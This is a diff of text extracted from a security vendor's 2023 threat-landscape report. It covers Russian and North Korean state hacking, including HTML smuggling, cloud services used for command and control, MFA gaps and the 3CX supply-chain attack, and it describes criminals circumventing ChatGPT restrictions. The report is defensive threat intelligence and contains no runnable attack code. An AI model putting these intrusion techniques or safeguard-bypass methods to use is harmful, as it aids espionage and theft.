-(Source: Secureworks)A similar deceptive spearphishing campaign in May 2023, likely byIRON RITUAL, impersonated the staff member of Poland's foreignembassy in Kyiv, using infrastructure and source material likelygained in a prior compromise. CTU analysis of the spearphishingemail, which delivered a Microsoft Word attachment named BMW5 for sale in Kyiv \- 2023\.docx containing malicious links, revealed aglobally diverse target set of organizations, including SecureworksNGO and IGO customers. However, all recipients were in someway government or non\-governmental entities aiding Ukraine.Attribution of the campaign to IRON RITUAL was based in part on aninfection chain employed by the group in varying forms as early as2021, which involves the delivery of first\-stage malware through anHTML\-smuggling technique dubbed EnvyScout. EnvyScout acts as adropper for additional malicious files, including Cobalt Strike or BruteRatel implants, served from popular third\-party cloud services likeDropBox, Google Drive, OneDrive, or Trello.2023 State of the Threat: A Year in Review5901Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreThe Blurred Lines Between 
+Attention
+Organizations directly or indirectly involved in relief efforts intended 
+for Ukraine but located outside of the immediate conflict zone 
+nonetheless became a target for Russian cyberespionage campaigns. 
+Targeted entities or those whose identities were hijacked and 
+incorporated into social engineering aspects of cyber operations fell 
+under the following sectors: 
+International logistics providers and weapons suppliers
+Refugee and human rights foundations
+Unmanned aerial systems (UAS) manufacturers 
+Scientific research institutions
+CTU researchers analyzed email artifacts likely used in credential 
+harvesting operations in August 2022 by IRON FRONTIER against 
+staff at two U.S. national laboratories. The threat actors impersonated 
+a fellow laboratory staff member in a multi\-day correspondence 
+which attempted to establish rapport and deceive the victim into 
+visiting a mock login page which mimicked another well\-known 
+laboratory.
+It is unknown whether the attack was successful in collecting any 
+credentials or what the threat actor's final objective was, but it 
+resembled prior IRON FRONTIER operations which have led to 
+credential disclosure and information theft reportedly reused in later 
+information operations. 
+A similar deceptive spearphishing campaign in May 2023, likely by 
+IRON RITUAL, impersonated the staff member of Poland's foreign 
+embassy in Kyiv, using infrastructure and source material likely 
+gained in a prior compromise. CTU analysis of the spearphishing 
+email, which delivered a Microsoft Word attachment named BMW 
+5 for sale in Kyiv \- 2023\.docx containing malicious links, revealed a 
+globally diverse target set of organizations, including Secureworks 
+NGO and IGO customers. However, all recipients were in some 
+way government or non\-governmental entities aiding Ukraine. 
+Attribution of the campaign to IRON RITUAL was based in part on an 
+infection chain employed by the group in varying forms as early as 
+2021, which involves the delivery of first\-stage malware through an 
+HTML\-smuggling technique dubbed EnvyScout. EnvyScout acts as a 
+dropper for additional malicious files, including Cobalt Strike or Brute 
+Ratel implants, served from popular third\-party cloud services like 
+DropBox, Google Drive, OneDrive, or Trello.
+Figure 29\. Threat actor provides technical support during exchange.
+(Source: Secureworks)
+60
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The Blurred Lines Between 
 Patriotic Hacktivism and Hostile 
-State Cyber OperationsA leaked U.S. classified intelligence assessment and other threatintelligence suggest that some of the KillNet collective's memberswere communicating or coordinating with elements of Russianintelligence services about their activities. While CTU researchershave not had direct insight into these groups' intrusions, it is feasibleThe past year has seen a sharp increase in the amount of patriotic\-that Russian government entities, directly or indirectly, play someminded Russian cyber groups seeking to harass organizationsrole in guiding the operations of these non\-state groups.considered adversaries of Russia. The groups use social media,predominantly the Telegram messaging platform, to marshalbrigades of followers, communicate targeting, and claim successfor disruptive distributed denial of services attacks. CTU researcherstracked the KillNet collective and saw the group target a diverserange of organizations in countries across Europe, the Middle East,Forced to Evolveand North America.0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial IntelligenceKillNet and KillNet\-aligned groups like Anonymous Sudan reportedlydid not use new or sophisticated methods in their attacks butlikely caused at least some temporary disruption to hundreds oforganizations across the following sectors since emerging at thestart of 2022:BanksAirports and aviation07ConclusionInformation Technology (IT) providers08AppendixMediaLaw enforcementGovernment portals2023 State of the Threat: A Year in Review6001Letter From Our VPThird\-Party Cloud APIsa 
-Favored Place for Russian C2swould query open Telegram channels to retrieve the C2 address,which CTU researchers observed being updated multiple times daily.This method of providing C2 information can be an effective meansof circumventing IP\-based filtering.Executive Summaryand Key FindingsWhile the malicious use of trusted third\-party cloud services isnot unique to hostile state actors, Russian cyber groups frequentlyincorporate them in their operations.The Business of CybercrimeCTU researchers identified samples of an early\-stage downloader0203Is Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendixattributed to IRON RITUAL called GraphicalNeutrino that usedthe Notion cloud\-based notetaking and productivity platform forcommand and control (C2\) purposes. The samples were contained ina malicious ZIP archive downloaded from a compromised WordPresssite via an EnvyScout HTML\-smuggling JavaScript. CTU analysis ofthe ZIP contents revealed that the loader performed queries to aNotion database via Notion's API service. The secret key embeddedin the downloader and used to authenticate to the service hadexpired prior to the analysis but third\-party researchers determinedthat similar GraphicalNeutrino samples make the API calls to uploadhost information and download additional payloads.An April 2023 report61 by the Computer Emergency Response Teamof Ukraine (CERT\-UA) observed an email campaign conducted byRussia's Foreign Intelligence Service against Ukraine that asked usersto run a PowerShell script that collected host information and thenuploaded it to the public Mocky API, a free service used by softwaredevelopers to test apps.And the popular Telegram messaging service was used by IRONTILDEN as a dead\-drop resolver for communicating commandand control server IP addresses. Hosts infected with IRON TILDENstagers dubbed GammaLoad (CERT\-UA) or DinoTrain (Microsoft)2023 State of the Threat: A Year in Review61Finish MFA Enrollment or IRON 
-RITUAL Will Do It for YouAlongside spearphishing, Russian threat groups continued toconduct traditional password\-spraying attacks to gain unauthorizedaccess to target environments. When weak credentials are found,multi\-factor authentication (MFA) will usually prevent the adversaryfrom advancing. But in 2022, CTU researchers observed a Russianstate\-sponsored threat group, likely IRON RITUAL, progressingbeyond MFA defenses by further identifying weak accounts whichwere yet to enroll in MFA. The threat actors exploited this weaknessto obtain full access to the victim's environment, logging into theexternal corporate VPN and using remote desktop services tonavigate the internal network. The intrusion was detected, actorevicted, and stronger defenses built through the addition of multipleAzure Active Directory conditional access policies.Figure 30\. Azure AD cloud audit logs from account takeover.
-(Source: Secureworks)01Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review6201Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixDEMOCRATIC PEOPLE'S
+State Cyber Operations
+The past year has seen a sharp increase in the amount of patriotic\-
+minded Russian cyber groups seeking to harass organizations 
+considered adversaries of Russia. The groups use social media, 
+predominantly the Telegram messaging platform, to marshal 
+brigades of followers, communicate targeting, and claim success 
+for disruptive distributed denial of services attacks. CTU researchers 
+tracked the KillNet collective and saw the group target a diverse 
+range of organizations in countries across Europe, the Middle East, 
+and North America. 
+KillNet and KillNet\-aligned groups like Anonymous Sudan reportedly 
+did not use new or sophisticated methods in their attacks but 
+likely caused at least some temporary disruption to hundreds of 
+organizations across the following sectors since emerging at the 
+start of 2022: 
+Banks 
+Airports and aviation 
+Information Technology (IT) providers 
+Media 
+Law enforcement 
+Government portals
+A leaked U.S. classified intelligence assessment and other threat 
+intelligence suggest that some of the KillNet collective's members 
+were communicating or coordinating with elements of Russian 
+intelligence services about their activities. While CTU researchers 
+have not had direct insight into these groups' intrusions, it is feasible 
+that Russian government entities, directly or indirectly, play some 
+role in guiding the operations of these non\-state groups.
+61
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Third\-Party Cloud APIsa 
+Favored Place for Russian C2s 
+While the malicious use of trusted third\-party cloud services is 
+not unique to hostile state actors, Russian cyber groups frequently 
+incorporate them in their operations. 
+CTU researchers identified samples of an early\-stage downloader 
+attributed to IRON RITUAL called GraphicalNeutrino that used 
+the Notion cloud\-based notetaking and productivity platform for 
+command and control (C2\) purposes. The samples were contained in 
+a malicious ZIP archive downloaded from a compromised WordPress 
+site via an EnvyScout HTML\-smuggling JavaScript. CTU analysis of 
+the ZIP contents revealed that the loader performed queries to a 
+Notion database via Notion's API service. The secret key embedded 
+in the downloader and used to authenticate to the service had 
+expired prior to the analysis but third\-party researchers determined 
+that similar GraphicalNeutrino samples make the API calls to upload 
+host information and download additional payloads. 
+An April 2023 report61 by the Computer Emergency Response Team 
+of Ukraine (CERT\-UA) observed an email campaign conducted by 
+Russia's Foreign Intelligence Service against Ukraine that asked users 
+to run a PowerShell script that collected host information and then 
+uploaded it to the public Mocky API, a free service used by software 
+developers to test apps. 
+And the popular Telegram messaging service was used by IRON 
+TILDEN as a dead\-drop resolver for communicating command 
+and control server IP addresses. Hosts infected with IRON TILDEN 
+stagers dubbed GammaLoad (CERT\-UA) or DinoTrain (Microsoft) 
+would query open Telegram channels to retrieve the C2 address, 
+which CTU researchers observed being updated multiple times daily. 
+This method of providing C2 information can be an effective means 
+of circumventing IP\-based filtering.
+62
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Finish MFA Enrollment or IRON 
+RITUAL Will Do It for You 
+Alongside spearphishing, Russian threat groups continued to 
+conduct traditional password\-spraying attacks to gain unauthorized 
+access to target environments. When weak credentials are found, 
+multi\-factor authentication (MFA) will usually prevent the adversary 
+from advancing. But in 2022, CTU researchers observed a Russian 
+state\-sponsored threat group, likely IRON RITUAL, progressing 
+beyond MFA defenses by further identifying weak accounts which 
+were yet to enroll in MFA. The threat actors exploited this weakness 
+to obtain full access to the victim's environment, logging into the 
+external corporate VPN and using remote desktop services to 
+navigate the internal network. The intrusion was detected, actor 
+evicted, and stronger defenses built through the addition of multiple 
+Azure Active Directory conditional access policies. 
+Figure 30\. Azure AD cloud audit logs from account takeover.
+(Source: Secureworks) 
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Main motivations:Financial GainEspionage
+DEMOCRATIC PEOPLE'S
 REPUBLIC OF KOREA 
-Revenue Remains the Major FocusMain motivations:Financial GainEspionage2023 State of the Threat: A Year in Review6301Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial IntelligenceNORTH KOREANorth Korean threat groups primarily split into two types: thoseAccording to research carried out by blockchain analytics companythat aim to gather outside geopolitical insight regarding countriesElliptic for Nikkei Asia63, North Korean threat groups have stolen $2\.3of interest, and others that focus on the need to sustain the Northbillion USD in crypto assets between 2017 and May 2023 (30 percentKorean economy and procure money for the isolated regime.of it from Japan alone). In comparison, their legitimate exports64Ultimately, the purpose of their activity is to inhibit any threats tototaled approximately $3\.6 billion over the same period (with 2017accounting for 58 percent of that figure), giving an insight into thevalue of these attacks to the North Korean economy. Nikkei Asiastates that the U.N. Security Council estimates that North Koreastole between $600 million and $1 billion in cryptocurrency in 2022,double the previous year's total. Elliptic estimated the figure at $640million for 2022\.the regime's security and stability.Cryptocurrency TheftSince at least 2020, North Koreaofficially known as theDemocratic People's Republic of Korea (DPRK)has devotedsignificant efforts to cryptocurrency theft, likely to compensatefor the economic impact of UN sanctions that prevent the countryfrom international trading.In the past year, North Korean threat actors have used AppleJeusmalware to steal cryptocurrency. AppleJeus62 was first discovered07Conclusionin 2018 and has been a fundamental tool for North Korea's financialtheft initiatives, masquerading as legitimate cryptocurrencytrading applications. Public reports have linked these attacks on08Appendixthe cryptocurrency industry to the Lazarus Group. CTU researchersbroadly track Lazarus Group as NICKEL ACADEMY and considerNICKEL GLADSTONE to be a subgroup that focuses heavily onrevenue generation for the North Korean regime.2023 State of the Threat: A Year in Review6401Letter From Our VPMultiple Operating Systems and a 
-Plethora of File Typesincluding CHM70, OneNote, VHD, boot sector, and ISO. Thedeployment of various file types was likely due in some part to thechange in the Windows default handling of VBA macros in July 2022,0203Executive Summaryand Key FindingsNorth Korean threat groups have deployed macOS malware formany years. For example, NICKEL GLADSTONE has used onevariant of AppleJeus malware dating back to 201865\. Since then,the use of malware built for platforms other than Windows hasThe Business of CybercrimeIs Boomtime Back?steadily increased. North Korean threat groups now deploy severaltypes of macOS\-based malware including AppleJeus, RustBucket66,CloudMensis67, and Manuscrypt68\.Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixThe macOS malware observed is often used in campaignstargeting blockchain technology, the cryptocurrency industry, anddecentralized finance (DeFi) organizations. There is some evidence tosuggest that the threat actors have adopted macOS tooling becausethe end users they target in these and associated sectors heavily usemachines running macOS.Linux malware also features in at least one North Korean threatgroup's arsenal. In April 2023, public reporting revealed that abackdoor dubbed SimplexTea69 was linked to NICKEL ACADEMY.North Korean threat groups have been observed deploying Linux\-based malware since at least 2017\.Throughout the past year, North Korean threat groups have alsoexperimented with many different file types for malware deliverywhich we described earlier in the report.Supply Chain AttacksIn April 2023, public reporting71 revealed that a North Korean threatgroup had orchestrated a cascading supply chain attack where onesupply chain compromise at the Xtrader futures trading companyenabled the threat actors to compromise a second supply chain atthe 3CX communications software company. Both the Xtrader and3CX compromises were possibly carried out to generate revenue,but the 3CX compromise was potentially also for cyberespionagepurposes. Multiple versions of a 3CX softphone application weretrojanized with ICONIC infostealer malware.Incident response efforts72 revealed that the initial supply chainattack occurred in early 2022; however, the second supply chainattack and subsequent campaign was not discovered until early 2023\.The string of supply chain attacks demonstrates the threat actors'persistence and willingness to devote preliminary resources withplans for long\-term results. In 2021, NICKEL ACADEMY conductedsome preliminary supply chain attacks that may have led up tolater efforts like the 3CX breach. The group compromised a SouthKorean think tank73 and a Latvian IT company74 to deliver a RAT andbackdoor malware.2023 State of the Threat: A Year in Review6501Letter From Our VPExecutive Summaryand Key Findings020306Threat Actor Use of 
-Artificial IntelligenceThe Business of CybercrimeIs Boomtime Back?Secureworks' monitoring of criminal forums and marketplaces showsthat criminal interest in ChatGPT and AI in general is on the rise, inline with increased interest in the topic across wider society.Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review6601Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial IntelligenceFigure 31\. Underground forum posts reflecting an increased interest in AI and 
-ML. (Source: Secureworks)Despite an abundance of sensationalist headlines and hyperbolearound ChatGPT and AI creating some kind of super intelligentmalware, the reality does not yet match up. The most commonuse of ChatGPT we have seen is as lures in phishing emails or onmalicious sites. These sites impersonate ChatGPT via typosquattingdomains such as chat\-gpt\-online\-pc.com and openai\-pc\-pro.online, with the aim of creating convincing home pages to promptusers into following malicious links or installing malicious browser07Conclusionextensions.08AppendixThreat actors and researchers are experimenting with the creationof malware which leverages ChatGPT functionality for defenseevasion and code creation. However, these types of AI models basetheir responses to user inputs on statistical analysis of previouslyproduced text and do not currently demonstrate the creativity andingenuity of human coders when finding novel ways to circumventsecurity controls and discover new vulnerabilities.In addition, some threat actors are advertising and selling access toAI\-based Telegram bots as a subscription service (see figure 30\).These bots allow users to request the creation of malicious scripts,craft phishing emails, or search for illicit goods on the dark web.The bot owners employ a pricing model that charges users by theinteraction. For example, one seller offered 20 unrestricted initialqueries but charged $5\.50 USD for every subsequent 100 queries.These Telegram bots may enable low\-skilled threat actors to useChatGPT functionality, bypassing ethical restrictions. The threatactors could create low\-value untested malware that they mayattempt to sell on underground forums, regardless of the quality andintegrity of the code. This approach is unlikely to provide meaningfulvolume or competition for the plethora of existing malware availablealready from criminal developers, at least in the short term.2023 State of the Threat: A Year in Review6701Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?Innovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08AppendixFigure 33\. XSSBot is ready to answer questions. (Source: Secureworks)Figure 32\. Example ChatGPT Telegram bot advertised on underground forum. 
-(Source: Secureworks)Threat actors often share research and ideas on undergroundforums, for example on how to use prompt engineering tocircumvent restrictions regarding ChatGPT requests. CTUresearchers have observed users seeking information about howThe rate at which AI is developing could change this situation, withChatGPT can improve their malicious code or streamline andone security researcher with minimal coding experience reportedlyautomate elements of their research and development. Thesegenerating in a matter of hours an infostealer that was not detectedforums will likely be a fertile breeding ground for experimentationby any antivirus engines on VirusTotal75\. This capability is likelyand sharing of ideas.already in the hands of larger teams of determined and experiencedmalware authors experimenting with how they can exploit theseAs of mid\-2023, despite these discussions and the obvious levelcapabilities.of interest displayed, phishing lures and Telegram bots remain themajor implementations. However, this could change soon. CriminalMany criminal forums now have dedicated sub\-forums to discuss AIactors are also experimenting with other Large Language Modelsand machine learning. One forum (XSS) has created an AI Bot (calledbeyond ChatGPT in an attempt to provide features that will aidXSSBot) which will answer questions put to it by users of the forum.criminal cyber activity, without the need to circumvent restrictionsfrom commercial services.2023 State of the Threat: A Year in Review6801Letter From Our VP07Conclusion0203Executive Summaryand Key FindingsOne of the things that makes cybersecurity such a fascinatingmore frequently than newly discovered ones. This continuesand challenging field is the need to combat and stay one stepto demonstrate the value of focusing on the cybersecurityahead of the continuing ingenuity of threat actors that this reportfundamentals alongside staying current on the latest exploits andThe Business of CybercrimeIs Boomtime Back?demonstrates. Sometimes their innovations are driven by lawTTPs.enforcement activity, such as taking down criminal marketplaces andforums, or by industry actions like Microsoft's disabling of macrosThe advice we regularly provide to customers is as relevant as ever:by default, or sometimes by political imperatives like China's desireIdentify your assets and their location on your network, stay up toto frustrate detection of its cyberespionage activities. Often, theydate with what is happening in the threat landscape, understand yourare another step in the arms race between malicious actors and therisk profile and use it to prioritize your control framework and yourefforts of companies like Secureworks to create the detections andapproach to vulnerability management. Lockdown internet\-facingcountermeasures that power systems like Taegis and protect oursystems and sensitive internal systems using fully implemented best\-customers. Some events, like Microsoft's decision to disable macros,practice MFA. Instrument your network to provide comprehensiveforce almost immediate change on the part of threat actors. Othermonitoring of all endpoint, network, and cloud resources. Wechanges are more gradual.understand that these recommendations, simple as they are to make,can sometimes be challenging to implement. However, workingHowever, as fast as some threat actors are to innovate, many areclosely with a trusted technology partner like Secureworks provides ahappy to continue doing what still works. CISA's annual roundupsignificant step forward in ensuring that your security practice keepsof top routinely exploited vulnerabilities reinforces that pointyou safe.in 202276, threat actors exploited older software vulnerabilitiesInnovations in TTPs Occur04When Infection Chains AreForced to Evolve0506State\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence07Conclusion08Appendix2023 State of the Threat: A Year in Review6901Letter From Our VP0203Executive Summaryand Key FindingsThe Business of CybercrimeIs Boomtime Back?08AppendixTaegis and the Secureworks View 
-of the ThreatSecureworks' view of the threat landscape comes from acombination of telemetry from the Taegis XDR and VDR platforms,incident response and Secureworks Adversary Group customerInnovations in TTPs Occurengagements, and technical and tactical research conducted by the04When Infection Chains AreCounter Threat Unit. These inputs combine to produce high\-fidelityThis data combines to illustrate threat actor behavior, revealing bothhigh\-level tactics and the technical details about their tooling. Itfeeds the threat intelligence products published every week by theCTU, and the unified Rosetta Stone that relates our threat groups tothe naming conventions used by other TI providers.It also produces inputs for the repository of knowledge that drivesthe elite threat detection and integrated response actions that Taegisdelivers. Other inputs include threat actor emulation and botnetForced to EvolveState\-SponsoredThreat ActivityThreat Actor Use ofArtificial Intelligence050607Conclusion08Appendixvisibility into threat actor intent, capability, and activity; and feed intoactionable intelligence what organizations need to do to reduce theiremulation.risk.In the 12 months from July 2022, the Secureworks Incident 
-Response team and Secureworks Counter Threat Unitconducted 1,300\+ incident response engagements, acrossa wide spectrum of industry sectors.Secureworks processes over 1\.8 trillion event logs aweek, or around 610 billion logs every single working day,gathered from security infrastructure in thousands ofcustomer environments around the world.CTU researchers gather and analyze data from internallygenerated and externally collected telemetry, from multiplesources including publicly available information, darkweb forums, proprietary botnet emulation systems, andintelligence relationships.1,300\+IR Engagements1\.8 Trillion\+Event Logs a Week100\+ CTU Researchers Gather Data from: Internally Generated
+Revenue Remains the Major Focus
+63
+64
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+NORTH KOREA
+North Korean threat groups primarily split into two types: those 
+that aim to gather outside geopolitical insight regarding countries 
+of interest, and others that focus on the need to sustain the North 
+Korean economy and procure money for the isolated regime. 
+Ultimately, the purpose of their activity is to inhibit any threats to 
+the regime's security and stability. 
+Cryptocurrency Theft
+Since at least 2020, North Koreaofficially known as the 
+Democratic People's Republic of Korea (DPRK)has devoted 
+significant efforts to cryptocurrency theft, likely to compensate 
+for the economic impact of UN sanctions that prevent the country 
+from international trading. 
+In the past year, North Korean threat actors have used AppleJeus 
+malware to steal cryptocurrency. AppleJeus62 was first discovered 
+in 2018 and has been a fundamental tool for North Korea's financial 
+theft initiatives, masquerading as legitimate cryptocurrency 
+trading applications. Public reports have linked these attacks on 
+the cryptocurrency industry to the Lazarus Group. CTU researchers 
+broadly track Lazarus Group as NICKEL ACADEMY and consider 
+NICKEL GLADSTONE to be a subgroup that focuses heavily on 
+revenue generation for the North Korean regime. 
+According to research carried out by blockchain analytics company 
+Elliptic for Nikkei Asia63, North Korean threat groups have stolen $2\.3 
+billion USD in crypto assets between 2017 and May 2023 (30 percent 
+of it from Japan alone). In comparison, their legitimate exports64 
+totaled approximately $3\.6 billion over the same period (with 2017 
+accounting for 58 percent of that figure), giving an insight into the 
+value of these attacks to the North Korean economy. Nikkei Asia 
+states that the U.N. Security Council estimates that North Korea 
+stole between $600 million and $1 billion in cryptocurrency in 2022, 
+double the previous year's total. Elliptic estimated the figure at $640 
+million for 2022\.
+65
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Multiple Operating Systems and a 
+Plethora of File Types
+North Korean threat groups have deployed macOS malware for 
+many years. For example, NICKEL GLADSTONE has used one 
+variant of AppleJeus malware dating back to 201865\. Since then, 
+the use of malware built for platforms other than Windows has 
+steadily increased. North Korean threat groups now deploy several 
+types of macOS\-based malware including AppleJeus, RustBucket66, 
+CloudMensis67, and Manuscrypt68\. 
+The macOS malware observed is often used in campaigns 
+targeting blockchain technology, the cryptocurrency industry, and 
+decentralized finance (DeFi) organizations. There is some evidence to 
+suggest that the threat actors have adopted macOS tooling because 
+the end users they target in these and associated sectors heavily use 
+machines running macOS. 
+Linux malware also features in at least one North Korean threat 
+group's arsenal. In April 2023, public reporting revealed that a 
+backdoor dubbed SimplexTea69 was linked to NICKEL ACADEMY. 
+North Korean threat groups have been observed deploying Linux\-
+based malware since at least 2017\. 
+Throughout the past year, North Korean threat groups have also 
+experimented with many different file types for malware delivery 
+including CHM70, OneNote, VHD, boot sector, and ISO. The 
+deployment of various file types was likely due in some part to the 
+change in the Windows default handling of VBA macros in July 2022, 
+which we described earlier in the report.
+Supply Chain Attacks
+In April 2023, public reporting71 revealed that a North Korean threat 
+group had orchestrated a cascading supply chain attack where one 
+supply chain compromise at the Xtrader futures trading company 
+enabled the threat actors to compromise a second supply chain at 
+the 3CX communications software company. Both the Xtrader and 
+3CX compromises were possibly carried out to generate revenue, 
+but the 3CX compromise was potentially also for cyberespionage 
+purposes. Multiple versions of a 3CX softphone application were 
+trojanized with ICONIC infostealer malware.
+Incident response efforts72 revealed that the initial supply chain 
+attack occurred in early 2022; however, the second supply chain 
+attack and subsequent campaign was not discovered until early 2023\. 
+The string of supply chain attacks demonstrates the threat actors' 
+persistence and willingness to devote preliminary resources with 
+plans for long\-term results. In 2021, NICKEL ACADEMY conducted 
+some preliminary supply chain attacks that may have led up to 
+later efforts like the 3CX breach. The group compromised a South 
+Korean think tank73 and a Latvian IT company74 to deliver a RAT and 
+backdoor malware.
+66
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Secureworks' monitoring of criminal forums and marketplaces shows 
+that criminal interest in ChatGPT and AI in general is on the rise, in 
+line with increased interest in the topic across wider society.
+06
+Threat Actor Use of 
+Artificial Intelligence
+67
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+Despite an abundance of sensationalist headlines and hyperbole 
+around ChatGPT and AI creating some kind of super intelligent 
+malware, the reality does not yet match up. The most common 
+use of ChatGPT we have seen is as lures in phishing emails or on 
+malicious sites. These sites impersonate ChatGPT via typosquatting 
+domains such as chat\-gpt\-online\-pc.com and openai\-pc\-pro.
+online, with the aim of creating convincing home pages to prompt 
+users into following malicious links or installing malicious browser 
+extensions.
+Threat actors and researchers are experimenting with the creation 
+of malware which leverages ChatGPT functionality for defense 
+evasion and code creation. However, these types of AI models base 
+their responses to user inputs on statistical analysis of previously 
+produced text and do not currently demonstrate the creativity and 
+ingenuity of human coders when finding novel ways to circumvent 
+security controls and discover new vulnerabilities. 
+In addition, some threat actors are advertising and selling access to 
+AI\-based Telegram bots as a subscription service (see figure 30\). 
+These bots allow users to request the creation of malicious scripts, 
+craft phishing emails, or search for illicit goods on the dark web. 
+The bot owners employ a pricing model that charges users by the 
+interaction. For example, one seller offered 20 unrestricted initial 
+queries but charged $5\.50 USD for every subsequent 100 queries. 
+These Telegram bots may enable low\-skilled threat actors to use 
+ChatGPT functionality, bypassing ethical restrictions. The threat 
+actors could create low\-value untested malware that they may 
+attempt to sell on underground forums, regardless of the quality and 
+integrity of the code. This approach is unlikely to provide meaningful 
+volume or competition for the plethora of existing malware available 
+already from criminal developers, at least in the short term.
+Figure 31\. Underground forum posts reflecting an increased interest in AI and 
+ML. (Source: Secureworks)
+68
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
+Forced to Evolve
+State\-Sponsored
+Threat Activity
+Threat Actor Use of
+Artificial Intelligence
+Conclusion
+Appendix
+02
+03
+04
+05
+06
+07
+08
+The rate at which AI is developing could change this situation, with 
+one security researcher with minimal coding experience reportedly 
+generating in a matter of hours an infostealer that was not detected 
+by any antivirus engines on VirusTotal75\. This capability is likely 
+already in the hands of larger teams of determined and experienced 
+malware authors experimenting with how they can exploit these 
+capabilities. 
+Many criminal forums now have dedicated sub\-forums to discuss AI 
+and machine learning. One forum (XSS) has created an AI Bot (called 
+XSSBot) which will answer questions put to it by users of the forum.
+Threat actors often share research and ideas on underground 
+forums, for example on how to use prompt engineering to 
+circumvent restrictions regarding ChatGPT requests. CTU 
+researchers have observed users seeking information about how 
+ChatGPT can improve their malicious code or streamline and 
+automate elements of their research and development. These 
+forums will likely be a fertile breeding ground for experimentation 
+and sharing of ideas. 
+As of mid\-2023, despite these discussions and the obvious level 
+of interest displayed, phishing lures and Telegram bots remain the 
+major implementations. However, this could change soon. Criminal 
+actors are also experimenting with other Large Language Models 
+beyond ChatGPT in an attempt to provide features that will aid 
+criminal cyber activity, without the need to circumvent restrictions 
+from commercial services.
+Figure 32\. Example ChatGPT Telegram bot advertised on underground forum. 
+(Source: Secureworks)
+Figure 33\. XSSBot is ready to answer questions. (Source: Secureworks)
+69
+2023 State of the Threat: A Year in Review
+01
+Letter From Our VP
+Executive Summary 
+and Key Findings
+The Business of Cybercrime
+Is Boomtime Back?
+Innovations in TTPs Occur 
+When Infection Chains Are 
